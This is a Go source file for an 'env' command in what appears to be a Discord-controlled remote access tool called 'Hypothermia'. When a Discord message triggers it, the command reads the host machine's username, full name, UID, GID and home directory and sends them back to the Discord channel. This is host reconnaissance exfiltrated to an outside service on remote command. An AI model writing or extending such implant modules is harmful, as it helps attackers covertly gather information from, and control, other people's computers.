package commands

import (
	"Hypothermia/src/utils"
	"github.com/bwmarrin/discordgo"
)

const envGetError string = "🟥 Failed to get the user profile."

func (*EnvCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	info, err := utils.GetUserProfile()
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, envGetError, m.Reference())
		return
	}

	var infoStr string
	infoStr += "Username: " + info.Username + "\n"
	infoStr += "Name: " + info.Name + "\n"
	infoStr += "Gid: " + info.Gid + "\n"
	infoStr += "Uid: " + info.Uid + "\n"
	infoStr += "HomeDir: " + info.HomeDir + "\n"

	s.ChannelMessageSendReply(m.ChannelID, infoStr, m.Reference())
}

func (*EnvCommand) Name() string {
	return "env"
}

func (*EnvCommand) Info() string {
	return "returns info about the users environment"
}

type EnvCommand struct{}
